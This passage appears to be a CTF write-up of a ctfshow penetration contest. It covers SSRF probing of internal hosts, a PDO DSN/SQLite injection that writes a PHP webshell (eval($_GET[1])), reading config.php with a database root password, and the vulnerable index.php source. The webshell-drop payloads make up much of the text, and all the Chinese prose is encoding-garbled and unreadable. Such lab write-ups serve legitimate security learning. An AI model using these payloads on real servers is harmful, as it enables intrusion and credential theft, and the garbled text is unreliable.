class="token boolean">True</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="requirements-txt"><a href="#requirements-txt" class="headerlink" title="requirements.txt"></a>requirements.txt</h3><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">annotated-types==0.6.0anyio==4.3.0bcrypt==4.2.1black==24.10.0blinker==1.8.2certifi==2024.2.2cffi==1.17.1charset-normalizer==3.3.2click==8.1.7colorama==0.4.6cos-python-sdk-v5==1.9.33crcmod==1.7cryptography==44.0.0dnspython==2.6.1docutils==0.21.2email_validator==2.1.1fastapi==0.115.6fastapi-cli==0.0.3Flask==3.0.3greenlet==3.0.3h11==0.14.0httpcore==1.0.5httptools==0.6.1httpx==0.27.0idna==3.6itsdangerous==2.2.0jaraco.classes==3.4.0jaraco.context==6.0.1jaraco.functools==4.1.0Jinja2==3.1.4keyring==25.5.0markdown-it-py==3.0.0MarkupSafe==2.1.5mdurl==0.1.2more-itertools==10.5.0mypy-extensions==1.0.0nh3==0.2.20orjson==3.10.3packaging==24.2passlib==1.7.4pathspec==0.12.1pkginfo==1.12.0platformdirs==4.3.6pycparser==2.22pycryptodome==3.21.0pydantic==2.7.1pydantic_core==2.18.2Pygments==2.18.0PyJWT==2.10.1PyMySQL==1.1.0python-dotenv==1.0.1python-multipart==0.0.9pywin32-ctypes==0.2.3PyYAML==6.0.1readme_renderer==44.0requests==2.31.0requests-toolbelt==1.0.0rfc3986==2.0.0rich==13.7.1secretMessageResponse==2.0.17setuptools==75.6.0shellingham==1.5.4six==1.17.0sniffio==1.3.1SQLAlchemy==2.0.30sqlmodel==0.0.22starlette==0.41.3tencentcloud-sdk-python==3.0.1145twine==6.0.1typer==0.12.3typing_extensions==4.11.0ujson==5.10.0urllib3==2.2.1uvicorn==0.29.0watchfiles==0.21.0websockets==12.0Werkzeug==3.0.3xmltodict==0.14.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103184410216.png" alt="image-20250103184410216"></p><p>è¿™é‡Œéƒ½æ˜¯å®ä½“ç±»æ²¡ä¸œè¥¿</p><hr><h2 id="æ¨ªå‘æ¸—é€"><a href="#æ¨ªå‘æ¸—é€" class="headerlink" title="æ¨ªå‘æ¸—é€"></a>æ¨ªå‘æ¸—é€</h2><p>åœ¨ &#x2F;downloadTaskFile è¿™é‡Œæµ‹è¯•å‰é¢ &#x2F;getServerInfo æ¥å£è·å–çš„ ip cæ®µï¼Œæµ‹å‡ºå†…ç½‘phpæœåŠ¡</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103185859314.png" alt="image-20250103185859314"></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"success"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"http://172.2.240.5"</span><span class="token punctuation">,</span><span class="token property">"file_content"</span><span class="token operator">:</span><span class="token string">"\n&lt;!DOCTYPE html lang=\"en\">\n\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    &lt;title>Database TEST&lt;/title>\n\t&lt;script>\n\t\tconst DATABASE_SECRET_KEY = '0x8F7C71E8E82E4D1E';\n\t&lt;/script>\n&lt;/head>\n\n&lt;body>\n    &lt;h1>Welcome to Database TEST&lt;/h1>\n    &lt;p>This is a test page for database connection and queries.&lt;/p>\n    &lt;form action=\"index.php\" method=\"get\">\n        &lt;label for=\"name\">Enter Database username:&lt;/label>\n        &lt;input type=\"text\" id=\"name\" name=\"username\" required>\n        &lt;br>&lt;br>\n        &lt;label for=\"password\">Enter Database password:&lt;/label>\n        &lt;input type=\"password\" id=\"password\" name=\"password\" required>\n        &lt;br>&lt;br>\n        &lt;label for=\"dsn\">Enter Database DSN:&lt;/label>\n        &lt;input type=\"text\" id=\"dsn\" name=\"dsn\" required>\n        &lt;br>&lt;br>\n        &lt;label for=\"query\">Enter TEST Query:&lt;/label>\n        &lt;input type=\"text\" id=\"query\" name=\"query\" required>\n        &lt;br>&lt;br>\n        &lt;input type=\"submit\" value=\"Submit\">\n    &lt;/form>\n&lt;/body>\n\n&lt;html>\n\n\n"</span><span class="token punctuation">,</span><span class="token property">"request_headers"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"User-Agent"</span><span class="token operator">:</span><span class="token string">"python-requests/2.31.0"</span><span class="token punctuation">,</span><span class="token property">"Accept-Encoding"</span><span class="token operator">:</span><span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span><span class="token property">"Accept"</span><span class="token operator">:</span><span class="token string">"*/*"</span><span class="token punctuation">,</span><span class="token property">"Connection"</span><span class="token operator">:</span><span class="token string">"keep-alive"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"response_headers"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"Server"</span><span class="token operator">:</span><span class="token string">"nginx/1.14.2"</span><span class="token punctuation">,</span><span class="token property">"Date"</span><span class="token operator">:</span><span class="token string">"Fri, 03 Jan 2025 10:57:34 GMT"</span><span class="token punctuation">,</span><span class="token property">"Content-Type"</span><span class="token operator">:</span><span class="token string">"text/html; charset=UTF-8"</span><span class="token punctuation">,</span><span class="token property">"Transfer-Encoding"</span><span class="token operator">:</span><span class="token string">"chunked"</span><span class="token punctuation">,</span><span class="token property">"Connection"</span><span class="token operator">:</span><span class="token string">"keep-alive"</span><span class="token punctuation">,</span><span class="token property">"X-Powered-By"</span><span class="token operator">:</span><span class="token string">"PHP/7.2.24"</span><span class="token punctuation">,</span><span class="token property">"Content-Encoding"</span><span class="token operator">:</span><span class="token string">"gzip"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flagï¼š<code>ctfshow&#123;0x8F7C71E8E82E4D1E&#125;</code></p><p>è¿˜æµ‹å‡ºå‰é¢æºç  8888 ç«¯å£çš„flaskï¼šï¼ˆipä¸ä¸€æ ·å› ä¸ºé‡å¯äº†é¶æœºï¼‰</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103195415832.png" alt="image-20250103195415832"></p><p>è¿˜æµ‹å‡ºä¸€ä¸ª jetty æœåŠ¡</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250104002347581.png" alt="image-20250104002347581"></p><p>è¿˜æœ‰ä¸€ä¸ª 172.2.xxx.2:7400 çš„æœåŠ¡ï¼Œè¿”å›401ï¼Œä¼°è®¡æ˜¯æ§åˆ¶ç¯å¢ƒç”¨çš„</p><hr><h1 id="ç¬¬ä¸‰ç« ï¼ˆPHPï¼‰"><a href="#ç¬¬ä¸‰ç« ï¼ˆPHPï¼‰" class="headerlink" title="ç¬¬ä¸‰ç« ï¼ˆPHPï¼‰"></a>ç¬¬ä¸‰ç« ï¼ˆPHPï¼‰</h1><h2 id="è·³å²›æˆ˜æœ¯"><a href="#è·³å²›æˆ˜æœ¯" class="headerlink" title="è·³å²›æˆ˜æœ¯"></a>è·³å²›æˆ˜æœ¯</h2><p>è·³å²›æˆ˜æœ¯ï¼ŒæŒ‡ç›´æ¥è·³è¿‡è¿™é¢˜æ‰“åé¢å‡ é“éé¢„æœŸï¼ˆ</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103190127370.png" alt="image-20250103190127370"></p><p>phpæœåŠ¡å™¨ 172.2.xxx.5</p><p>è§‚å¯Ÿä¸€ä¸‹å‰é¢å¾—åˆ°çš„html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span> <span class="token name">lang=</span><span class="token string">"en"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">        <span class="token keyword">const</span> <span class="token constant">DATABASE_SECRET_KEY</span> <span class="token operator">=</span> <span class="token string">'0x8F7C71E8E82E4D1E'</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome to Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>This is a test page for database connection and queries.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database DSN:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter TEST Query:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•å‘ç° config.php å’Œ index.php åœ¨åŒä¸€ä¸ªç›®å½•</p><p>hintï¼š</p><blockquote><p>&amp;<br>sqliteæ˜¯å¯ä»¥ä¸ç”¨è´¦å·å¯†ç çš„<br>å¿…é¡»æœ‰çœŸå®çš„è¡¨ç»“æ„ï¼Œæ‰èƒ½æ–‡ä»¶è½åœ°</p></blockquote><p>æœ¬åœ°å†™ä¸€ä¸ªpdoæŸ¥è¯¢æµ‹ä¸€ä¸‹</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">?dsn&#x3D;sqlite:test.php&amp;query&#x3D;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY,&#39;&lt;?php phpinfo();?&gt;&#39; TEXT NOT NULL,email TEXT NOT NULL,created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250105191146898.png" alt="image-20250105191146898"></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250105191653338.png" alt="image-20250105191653338"></p><p>èƒ½å†™ï¼Œæ¥ä¸‹æ¥å°è¯•æ‰“è¿œç¨‹</p><p>éœ€è¦urlç¼–ç ï¼š</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">index.php?dsn&#x3D;sqlite:user.php%26query&#x3D;CREATE%20TABLE%20users(id%20INTEGER%20PRIMARY%20KEY,user%20TEXT%20NOT%20NULL);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯æ‰€æœ‰äººéƒ½å¡åœ¨äº†æ¥æ”¶ä¸åˆ°å‚æ•°ä¸Šã€‚ã€‚</p><p>äºæ˜¯åˆ°äº†6å·ä¸‹åˆï¼Œè¿™ä¸ªæ—¶å€™æ•°æ®åº“æœ‰å›æ˜¾äº†ï¼Œæœç„¶æ˜¯ç¯å¢ƒæœ‰é—®é¢˜ï¼ˆ</p><p>éœ€è¦å…ˆç”Ÿæˆä¸€ä¸ªå®Œæ•´è¡¨ç»“æ„çš„æ–‡ä»¶ï¼š</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">index.php?dsn&#x3D;sqlite:user.db%26query&#x3D;CREATE%20TABLE%20users(id%20INTEGER%20PRIMARY%20KEY,user%20TEXT%20NOT%20NULL);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°è¯•å†™é©¬ï¼ˆç¬¬äºŒæ®µpayloadéœ€è¦phpç”¨<code>exec</code>æ‰èƒ½å†™é©¬ï¼‰</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">?dsn&#x3D;sqlite:user.php%26query&#x3D;CREATE%20TABLE%20users(id%20INTEGER%20PRIMARY%20KEY,&#39;&lt;?php%20phpinfo();?&gt;&#39;%20TEXT%20NOT%20NULL);?dsn&#x3D;sqlite:user.db%26query&#x3D;ATTACH%2BDATABASE%2B%22%2Fvar%2Fwww%2Fhtml%2Fcmd%2Ephp%22%2BAS%2Bshell%3Bcreate%2BTABLE%2Bshell%2Eexp%2B%28payload%2Btext%29%3Binsert%2BINTO%2Bshell%2Eexp%2B%28payload%29%2BVALUES%28%22%3C%3F%3Deval%28%24%5FGET%5B0%5D%29%3B%22%29%3B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>èƒ½ç”Ÿæˆæ–‡ä»¶ï¼Œä½†æ˜¯è®¿é—®è¿”å›500ï¼ŒçŒœæµ‹å’Œ sqlite é‚£å †å­—ç¬¦æœ‰å…³ï¼Œå¾—å†™ä¸€ä¸ªå¹²å‡€çš„shell</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>ç¢ç£¨äº†åŠå¤©ç¾¤ä¸»ç›´æ¥ç»™payloadäº†ï¼š</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">%3fdsn&#x3D;sqlite:shell.php%26username&#x3D;aaa%26password&#x3D;bbb%26query&#x3D;create%20table%20&quot;aaa&quot;%20(name%20TEXT%20DEFAULT%20&quot;&lt;?php%20file_put_contents(&#39;1.php&#39;,&#39;&lt;?php eval($_GET[1]);?&gt;&#39;);?&gt;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶è®¿é—®shell.phpè™½ç„¶æ¥å£æœåŠ¡ä¼šæŠ¥500ï¼Œä½†æ˜¯å·²ç»ç”Ÿæˆäº†1.php</p><p>ç„¶åå°±getshelläº†</p><p>è¯»config.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//æ•°æ®åº“è¿æ¥é…ç½®</span><span class="token variable">$database_host</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$database_user</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$database_password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5"</span><span class="token punctuation">;</span><span class="token variable">$database_name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"web_db_2"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagï¼š<code>ctfshow&#123;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&#125;</code></p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pdo</span> <span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span><span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dsn'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token function">pdo_init</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pdo</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"database init faild"</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token function">pdo_query</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pdo_close</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">!==</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"database test success"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"database test error"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">pdo_init</span><span class="token punctuation">(</span><span class="token variable">$dns</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dns</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$pdo</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ•°æ®åº“è¿æ¥å¤±è´¥ï¼š"</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">pdo_query</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$stmt</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ•°æ®åº“æ“ä½œå¤±è´¥ï¼š"</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">pdo_close</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token 